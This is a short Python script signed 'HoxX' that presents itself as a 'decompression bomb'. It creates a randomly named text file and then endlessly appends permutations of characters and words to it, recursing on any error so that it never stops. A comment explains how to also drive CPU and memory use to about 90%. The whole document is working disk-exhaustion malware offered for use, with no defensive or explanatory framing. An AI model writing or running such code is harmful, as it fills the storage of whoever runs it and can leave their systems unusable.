import random
from itertools import permutations
sekv = ["0","1","2","3","4","5","6","7","8","9","a","zgod","mla","pok","skup"]
rn = random.choice(sekv)
global bombb
bombb = "bomb{}.txt".format(rn)
with open(bombb ,"w+") as starter:
    starter.write("Welcome to the bomb experience by HoxX\n")
    starter.close()
    
def RandomGenerator():
    print("[+]Decompression bomb running !\n")
    print("[+]WARNING ! This program takes around 30s to generate 1 gigabyte.\n")
    letters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    cap_letters = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
    numbers = ["0","1","2","3","4","5","6","7","8","9"]
    decyphers = ["Python","Visited","You","Hahahahah"]
    complete_list = letters + cap_letters + numbers + decyphers
    perm = permutations(complete_list)
    #perm = permutations(list(perm))  if you want the CPU to be at 90% and Memory also.
    #if you dont and you just want to take up space , run the regular thing
    with open(bombb ,mode="a") as file:
        for k in perm:
            file.write(str(k))
    file.close()
    RandomGenerator()
try:
    RandomGenerator()
except:
    RandomGenerator()